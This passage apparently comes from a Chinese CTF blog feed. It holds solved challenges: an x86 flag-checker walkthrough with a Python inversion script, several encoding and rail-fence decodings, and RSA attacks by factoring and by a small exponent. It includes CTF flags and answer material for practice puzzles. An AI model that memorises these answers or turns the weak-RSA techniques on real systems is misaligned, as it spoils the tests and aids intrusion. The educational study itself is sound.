class="line">.text:000000000040157A                 call    scanf</span><br><span class="line">.text:000000000040157F                 lea     rax, [rbp+Str]</span><br><span class="line">.text:0000000000401583                 mov     rcx, rax        ; Str</span><br><span class="line">.text:0000000000401586                 call    strlen</span><br><span class="line">.text:000000000040158B                 cmp     rax, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:000000000040158F                 jz      short loc_40159B</span><br><span class="line">.text:0000000000401591                 mov     eax, 0</span><br><span class="line">.text:0000000000401596                 jmp     loc_40162B</span><br><span class="line">.text:000000000040159B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040159B</span><br><span class="line">.text:000000000040159B loc_40159B:                             ; CODE XREF: main+3F↑j</span><br><span class="line">.text:000000000040159B                 mov     [rbp+var_4], 0</span><br><span class="line">.text:00000000004015A2</span><br><span class="line">.text:00000000004015A2 loc_4015A2:                             ; CODE XREF: main+C8↓j</span><br><span class="line">.text:00000000004015A2                 cmp     [rbp+var_4], 22h ; &#x27;&quot;&#x27;</span><br><span class="line">.text:00000000004015A6                 jg      short loc_40161A</span><br><span class="line">.text:00000000004015A8                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015AB                 cdqe</span><br><span class="line">.text:00000000004015AD                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015B2                 xor     eax, 52h</span><br><span class="line">.text:00000000004015B5                 mov     edx, eax</span><br><span class="line">.text:00000000004015B7                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015BA                 cdqe</span><br><span class="line">.text:00000000004015BC                 mov     [rbp+rax+Str], dl</span><br><span class="line">.text:00000000004015C0                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015C3                 cdqe</span><br><span class="line">.text:00000000004015C5                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015CA                 add     eax, 5</span><br><span class="line">.text:00000000004015CD                 mov     edx, eax</span><br><span class="line">.text:00000000004015CF                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015D2                 cdqe</span><br><span class="line">.text:00000000004015D4                 mov     [rbp+rax+Str], dl</span><br><span class="line">.text:00000000004015D8                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015DB                 cdqe</span><br><span class="line">.text:00000000004015DD                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015E2                 movsx   eax, al</span><br><span class="line">.text:00000000004015E5                 mov     edx, [rbp+var_4]</span><br><span class="line">.text:00000000004015E8                 movsxd  rdx, edx</span><br><span class="line">.text:00000000004015EB                 lea     rcx, ds:0[rdx*4]</span><br><span class="line">.text:00000000004015F3                 lea     rdx, res</span><br><span class="line">.text:00000000004015FA                 mov     edx, [rcx+rdx]</span><br><span class="line">.text:00000000004015FD                 cmp     eax, edx</span><br><span class="line">.text:00000000004015FF                 jz      short loc_401614</span><br><span class="line">.text:0000000000401601                 lea     rcx, aWrong     ; &quot;Wrong!&quot;</span><br><span class="line">.text:0000000000401608                 call    puts</span><br><span class="line">.text:000000000040160D                 mov     eax, 0</span><br><span class="line">.text:0000000000401612                 jmp     short loc_40162B</span><br><span class="line">.text:0000000000401614 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401614</span><br><span class="line">.text:0000000000401614 loc_401614:                             ; CODE XREF: main+AF↑j</span><br><span class="line">.text:0000000000401614                 add     [rbp+var_4], 1</span><br><span class="line">.text:0000000000401618                 jmp     short loc_4015A2</span><br><span class="line">.text:000000000040161A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040161A</span><br><span class="line">.text:000000000040161A loc_40161A:                             ; CODE XREF: main+56↑j</span><br><span class="line">.text:000000000040161A                 lea     rcx, aGood      ; &quot;Good!&quot;</span><br><span class="line">.text:0000000000401621                 call    puts</span><br><span class="line">.text:0000000000401626                 mov     eax, 0</span><br><span class="line">.text:000000000040162B</span><br><span class="line">.text:000000000040162B loc_40162B:                             ; CODE XREF: main+46↑j</span><br><span class="line">.text:000000000040162B                                         ; main+C2↑j</span><br><span class="line">.text:000000000040162B                 add     rsp, 90h</span><br><span class="line">.text:0000000000401632                 pop     rbp</span><br><span class="line">.text:0000000000401633                 retn</span><br><span class="line">.text:0000000000401633 main            endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint = 0x21,0x6,0x6,0x16,0xb,0x19,0x2e,0x65,0x35,0x6a,0x6f,0x38,0x36,0x84,0x70,0x3b,0x39,0x65,0x38,0x35,0x84,0x6f,0x36,0x3c,0x6a,0x38,0x68,0x84,0x66,0x70,0x3b,0x38,0x6a,0x36,0x34,</span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550 push rbp </span><br><span class="line">.text:0000000000401551 mov rbp, rsp </span><br><span class="line">.text:0000000000401554 sub rsp, 90h </span><br><span class="line">.text:000000000040155B call __main</span><br><span class="line">#对应伪代码</span><br><span class="line">int main() &#123; </span><br><span class="line">// 保存旧的栈帧指针，设置新的栈帧，为局部变量分配空间 </span><br><span class="line">// push rbp; mov rbp, rsp; sub rsp, 90h </span><br><span class="line">// 调用初始化函数（可能是C标准库的初始化） </span><br><span class="line">__main();</span><br><span class="line"></span><br><span class="line">.text:0000000000401560 lea rcx, Buffer ;&quot;input your flag:&quot; </span><br><span class="line">.text:0000000000401567 call puts</span><br><span class="line">#对应伪代码</span><br><span class="line">puts(&quot;input your flag:&quot;);</span><br><span class="line"></span><br><span class="line">.text:000000000040156C lea rax, [rbp+Str] .text:0000000000401570 mov rdx, rax .text:0000000000401573 lea rcx, Format ; &quot;%s&quot; .text:000000000040157A call scanf</span><br><span class="line">#对应伪代码</span><br><span class="line">// 读取用户输入到局部变量Str中 </span><br><span class="line">char Str[/* 大小取决于栈空间分配 */]; </span><br><span class="line">scanf(&quot;%s&quot;, Str);</span><br><span class="line"></span><br><span class="line">.text:000000000040157F lea rax, [rbp+Str] .text:0000000000401583 mov rcx, rax ; Str .text:0000000000401586 call strlen .text:000000000040158B cmp rax, 23h ; &#x27;#&#x27; .text:000000000040158F jz short loc_40159B .text:0000000000401591 mov eax, 0 .text:0000000000401596 jmp loc_40162B</span><br><span class="line">#对应伪代码</span><br><span class="line">// 检查输入长度是否为35(0x23) </span><br><span class="line">if (strlen(Str) != 35) &#123; </span><br><span class="line">return 0; // 长度不符则退出 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:000000000040159B mov [rbp+var_4], 0 ; i = 0 .text:00000000004015A2 loc_4015A2: ; 循环开始 .text:00000000004015A2 cmp [rbp+var_4], 22h ; i &lt;= 34? </span><br><span class="line">.text:00000000004015A6 jg short loc_40161A .text:00000000004015A8 mov eax, [rbp+var_4] .text:00000000004015AB cdqe ; 符号扩展 .text:00000000004015AD movzx eax, [rbp+rax+Str] ; 取Str[i] </span><br><span class="line">.text:00000000004015B2 xor eax, 52h ; Str[i] ^= 0x52 #xor异或运算</span><br><span class="line">.text:00000000004015B5 mov edx, eax .text:00000000004015B7 mov eax, [rbp+var_4] .text:00000000004015BA cdqe .text:00000000004015BC mov [rbp+rax+Str], dl ; 写回Str[i] </span><br><span class="line">.text:00000000004015C0 mov eax, [rbp+var_4] .text:00000000004015C3 cdqe .text:00000000004015C5 movzx eax, [rbp+rax+Str] .text:00000000004015CA add eax, 5 ; Str[i] += 5 .text:00000000004015CD mov edx, eax .text:00000000004015CF mov eax, [rbp+var_4] .text:00000000004015D2 cdqe .text:00000000004015D4 mov [rbp+rax+Str], dl ; 写回Str[i]</span><br><span class="line">#对应伪代码</span><br><span class="line">// 初始化循环变量i=0 </span><br><span class="line">int i = 0; </span><br><span class="line">// 循环处理每个字符，直到i &gt; 34 (0x22) </span><br><span class="line">while (i &lt;= 34) &#123; </span><br><span class="line">// 对Str[i]进行变换：先异或0x52 </span><br><span class="line">Str[i] ^= 0x52; </span><br><span class="line">Str[i] += 5;// 再加上5</span><br><span class="line"></span><br><span class="line">.text:00000000004015D8 mov eax, [rbp+var_4] .text:00000000004015DB cdqe .text:00000000004015DD movzx eax, [rbp+rax+Str] .text:00000000004015E2 movsx eax, al ; 符号扩展 .text:00000000004015E5 mov edx, [rbp+var_4] .text:00000000004015E8 movsxd rdx, edx .text:00000000004015EB lea rcx, ds:0[rdx*4] ; hint[i*4]? </span><br><span class="line">.text:00000000004015F3 lea rdx, res ; 可能是hint数组基址 </span><br><span class="line">.text:00000000004015FA mov edx, [rcx+rdx] ; 取hint[i] </span><br><span class="line">.text:00000000004015FD cmp eax, edx ; 比较Str[i]与hint[i] </span><br><span class="line">.text:00000000004015FF jz short loc_401614 ; 相等则继续 </span><br><span class="line">.text:0000000000401601 lea rcx, aWrong ; &quot;Wrong!&quot; .text:0000000000401608 call puts .text:000000000040160D mov eax, 0 .text:0000000000401612 jmp short loc_40162B</span><br><span class="line">#对应伪代码</span><br><span class="line">// 检查变换后的Str[i]是否等于hint[i] </span><br><span class="line">if (Str[i] != hint[i]) &#123; </span><br><span class="line">puts(&quot;Wrong!&quot;); // 不相等则输出错误信息 </span><br><span class="line">return 0; // 并退出程序 </span><br><span class="line">&#125; </span><br><span class="line">i++; // 循环变量递增 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:000000000040161A loc_40161A: ; 循环结束后执行 .text:000000000040161A lea rcx, aGood ; &quot;Good!&quot; .text:0000000000401621 call puts .text:0000000000401626 mov eax, 0</span><br><span class="line">#对应伪代码</span><br><span class="line">// 所有字符验证通过，输出&quot;Good!&quot; </span><br><span class="line">puts(&quot;Good!&quot;); </span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">.text:000000000040162B loc_40162B: .text:000000000040162B add rsp, 90h ; 释放局部变量空间 </span><br><span class="line">.text:0000000000401632 pop rbp ; 恢复旧的栈帧指针 .text:0000000000401633 retn ; 返回</span><br><span class="line">#对应伪代码</span><br><span class="line">// 函数结束，栈帧恢复 </span><br><span class="line">&#125; // 对应main函数结束</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">char Str[/* 长度动态 */]; </span><br><span class="line">printf(&quot;input your flag:&quot;); // puts(&quot;input your flag:&quot;) </span><br><span class="line">scanf(&quot;%s&quot;, Str); // 读取用户输入到 Str </span><br><span class="line">if (strlen(Str) != 0x23) &#123; // 0x23 = 35，检查输入长度是否为 35 </span><br><span class="line">printf(&quot;Wrong!&quot;); // 长度不对直接报错 </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br><span class="line">// 第一步：异或 0x52 </span><br><span class="line">Str[i] ^= 0x52; </span><br><span class="line">// 第二步：加 5 </span><br><span class="line">Str[i] += 5; </span><br><span class="line">// 第三步：与 hint 数组对比 </span><br><span class="line">if (Str[i] != hint[i]) &#123; </span><br><span class="line">printf(&quot;Wrong!&quot;); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路：逆向推导-Flag"><a href="#解题思路：逆向推导-Flag" class="headerlink" title="解题思路：逆向推导 Flag"></a>解题思路：逆向推导 Flag</h3><p>已知 <code>hint</code> 数组，需<strong>反向推导原始输入 <code>Str</code></strong>（即 Flag ）。<br>逆向推导原始 <code>Str[i]</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Str[i] = (hint[i] - 5) ^ 0x52  </span><br></pre></td></tr></table></figure><p><strong>编写逆向计算脚本</strong><br>用 Python 反向推导每个 <code>Str[i]</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hint = [<span class="number">0x21</span>,<span class="number">0x6</span>,<span class="number">0x6</span>,<span class="number">0x16</span>,<span class="number">0xb</span>,<span class="number">0x19</span>,<span class="number">0x2e</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0x6f</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x84</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0x39</span>,<span class="number">0x65</span>,<span class="number">0x38</span>,<span class="number">0x35</span>,<span class="number">0x84</span>,<span class="number">0x6f</span>,<span class="number">0x36</span>,<span class="number">0x3c</span>,<span class="number">0x6a</span>,<span class="number">0x38</span>,<span class="number">0x68</span>,<span class="number">0x84</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0x38</span>,<span class="number">0x6a</span>,<span class="number">0x36</span>,<span class="number">0x34</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> hint:</span><br><span class="line">    temp = (h - <span class="number">5</span>) ^ <span class="number">0x52</span> <span class="comment">#逆向计算:先减5,再异或 0x52</span></span><br><span class="line">    flag.append(<span class="built_in">chr</span>(temp))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))<span class="comment"># 拼接字符得到 Flag</span></span><br></pre></td></tr></table></figure><p>NSSCTF{2b78ac-9df2ab-8ce7a1-39da7c}</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ascii</title>
      <link href="/2025/06/4ae6af308ca1.html"/>
      <url>/2025/06/4ae6af308ca1.html</url>
      
        <content type="html"><![CDATA[<p>54 5a 43 46 6c 61 67 7b 48 65 6c 6c 6f 5f 41 53 43 49 49 7d<br><img src="/images/D49E689A-C316-4E38-8BC3-7F6155521A10.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> ASCII编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Quoted-printable</title>
      <link href="/2025/06/898b6c6144d9.html"/>
      <url>/2025/06/898b6c6144d9.html</url>
      
        <content type="html"><![CDATA[<p>&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6<br>原理是没有等号就把英文、数字等原样输出，等号加两个十六进制数代表一个非 Ascii 码范围的字符（如汉字）或特殊字符。<br><img src="/images/Pastedimage20250601184509.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> Quoted-printable编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tap tap</title>
      <link href="/2025/06/d953a328927b.html"/>
      <url>/2025/06/d953a328927b.html</url>
      
        <content type="html"><![CDATA[<p>小明最近在追《疑犯追凶》，在第二季结尾的时候出现了这么一张图片，他却没看懂啥意思，你能帮帮他吗 flag格式为TZCFlag{xxxx},xxxx全大写<br><img src="/images/tapcode.webp"></p><ul><li><code>44</code> 对应字母 <code>T</code> 。</li><li><code>42</code> 对应字母 <code>R</code> 。</li><li><code>11</code> 对应字母 <code>A</code> 。</li><li><code>24</code> 对应字母 <code>I</code> 。</li><li><code>33</code> 对应字母 <code>N</code> 。</li><li><code>43</code> 对应字母 <code>S</code> 。</li><li><code>44</code> 对应字母 <code>T</code> 。</li><li><code>33</code> 对应字母 <code>N</code> 。<br>TZCFlag{TRAINSTN}</li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 敲击码(Tap code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/55b5fee0b6cc.html"/>
      <url>/2025/06/55b5fee0b6cc.html</url>
      
        <content type="html"><![CDATA[<p>&#x3D;&#x3D;<strong>加密</strong>&#x3D;&#x3D;<br>当加密为两组时，把将要传递的信息中的字母交替排成上下两行。</p><p>再将下面一行字母排在上面一行的后边，从而形成一段密码。</p><p>例如：加密明文。<br><strong><em>ALL LIFE IS A GAME OF LUCK</em></strong></p><p>当加密为两组时，将句子从上往下交替写成两行，也就是第一 三 五等奇数个字母作为第一组，第二四六作为第二组。</p><p><strong><em>ALIESGMOLC</em></strong></p><p><strong><em>LLFIAAEFUK</em></strong></p><p>再将第一组放在第二组前</p><p><em><strong>ALIESGMOLCLLFIAAEFUK</strong></em></p><p>加密完成。</p><p>&#x3D;&#x3D;<strong>解 密</strong>&#x3D;&#x3D;<br>第一步将密文按组分开。当密文字母个数为奇数个时，第一组比第二组多一个。<br>第二步自上向下读出。 </p><p>举例：<br>密文：<em><strong>TMKECDYONOAEAHACUT</strong></em></p><p>密文字母个数为18，第一组9个字母，第二组9个字母。</p><p><em><strong>TMKECDYON</strong></em><br><em><strong>OAEAHACUT</strong></em></p><p>自上向下读出：<em><strong>TOMAKEEACHDAYCOUNT</strong></em></p><p>得明文：<em><strong>TO MAKE EACH DAY COUNT</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 换位密码 </category>
          
          <category> 栅栏密码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>篱笆墙的影子</title>
      <link href="/2025/06/d3e8b0c9d849.html"/>
      <url>/2025/06/d3e8b0c9d849.html</url>
      
        <content type="html"><![CDATA[<p>felhaagv{ewtehtehfilnakgw}</p><p>看这个felhaag，flag在里面很明显，最后一位是} 。<br>分成两组<br>f l a g { w e t h i n k w<br>e h a v e t h e f l a g }<br>这就是加密<br>flag{wethinkwehavetheflag}<br><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a>            [在线栅栏加解密]</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 换位密码 </category>
          
          <category> 栅栏密码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/54ed00852af2.html"/>
      <url>/2025/06/54ed00852af2.html</url>
      
        <content type="html"><![CDATA[<h3 id="编码规则"><a href="#编码规则" class="headerlink" title="编码规则"></a>编码规则</h3><p>将字母表排列成 5×5 的矩阵（C和K共用一格 ） ，如下：<br>|<img src="/images/Pastedimage20250603134130.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 敲击码(Tap code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c,n,e</title>
      <link href="/2025/06/4c96d1aad14e.html"/>
      <url>/2025/06/4c96d1aad14e.html</url>
      
        <content type="html"><![CDATA[<p>c &#x3D; 566134289175001073338056659296498386641704313655869270504728356324933522811329068806508523532229682163525391220524802986785979422224911403071360548998101883993096018419857810663495564026562659363871989824162135535273717970285889221585901801835578256566036552604952749911282130835836581634840314211017046826426109774890418389574576128514071616464686335314358612894449871297012320880991577385456512998134643750537355527145843861005150574206728763965567156607610158050662833497593328881837388826744959143787862030176066778562928676173698618553745217799573433348833221151549888811871451808452955305602107063553259177528973779863154453333102822257682773411954333494475389886363107483562321532979964779714092494561759919711378961571336972685333275022586113138145007123147423870377012703192994633879942428704057951403358824692549839968488524015173505870905889600039037750913144895609595459004953371070240801671011997833228707676492818822464352241156584093362459311507045539329339058073049976087255850541570728786975634641284864343466456814506387776441995199436103111145990444660701184107235574238419914669387830626551319768539563036924648893943101966787768445626547186646731973307521638141189845168175085035920200073130311681615711143905321<br>n &#x3D; 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533<br>e &#x3D; 65537</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from sympy import factorint</span><br><span class="line">from sympy import mod_inverse</span><br><span class="line">n = 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533</span><br><span class="line"></span><br><span class="line"># 分解 n</span><br><span class="line">factors = factorint(n)</span><br><span class="line">p, q = factors.keys()</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = 566134289175001073338056659296498386641704313655869270504728356324933522811329068806508523532229682163525391220524802986785979422224911403071360548998101883993096018419857810663495564026562659363871989824162135535273717970285889221585901801835578256566036552604952749911282130835836581634840314211017046826426109774890418389574576128514071616464686335314358612894449871297012320880991577385456512998134643750537355527145843861005150574206728763965567156607610158050662833497593328881837388826744959143787862030176066778562928676173698618553745217799573433348833221151549888811871451808452955305602107063553259177528973779863154453333102822257682773411954333494475389886363107483562321532979964779714092494561759919711378961571336972685333275022586113138145007123147423870377012703192994633879942428704057951403358824692549839968488524015173505870905889600039037750913144895609595459004953371070240801671011997833228707676492818822464352241156584093362459311507045539329339058073049976087255850541570728786975634641284864343466456814506387776441995199436103111145990444660701184107235574238419914669387830626551319768539563036924648893943101966787768445626547186646731973307521638141189845168175085035920200073130311681615711143905321</span><br><span class="line">e = 65537</span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line">m = pow(c, d, n) </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">    m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)</span><br><span class="line">    return m_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">flag = num_to_ascii(m)</span><br><span class="line">print(f&quot;flag = &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure><p> flag&#x3D;TZCFlag{factor_is_so_easy}<br><img src="/images/Pastedimage20250603143451.png"></p><hr><p>n &#x3D; 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793<br>e &#x3D; 3  <strong>&#x3D;&#x3D;当e较小时则可直接通过开立方根得到明文&#x3D;&#x3D;</strong><br>c &#x3D; 6021062141588965841587167293</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span><br><span class="line">e = 3</span><br><span class="line">c = 6021062141588965841587167293</span><br><span class="line"></span><br><span class="line"># 计算立方根</span><br><span class="line">m = round(c ** (1/3))</span><br><span class="line">if pow(m, 3) == c:</span><br><span class="line">    print(&quot;明文整数:&quot;, m)</span><br><span class="line">    flag = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;).decode(&#x27;ascii&#x27;)</span><br><span class="line">    print(&quot;Flag:&quot;, flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;无法通过低指数攻击破解&quot;)</span><br></pre></td></tr></table></figure><p>明文整数: 1819244357<br>Flag: lowE<br>TZCFlag{lowE}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>n1,n2,e,c共享素因数</title>
      <link href="/2025/06/6f67f52f7ab4.html"/>
      <url>/2025/06/6f67f52f7ab4.html</url>
      
        <content type="html"><![CDATA[<p>n1&#x3D;9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327<br>n2&#x3D;13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743<br>e &#x3D; 65537<br>c &#x3D; 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 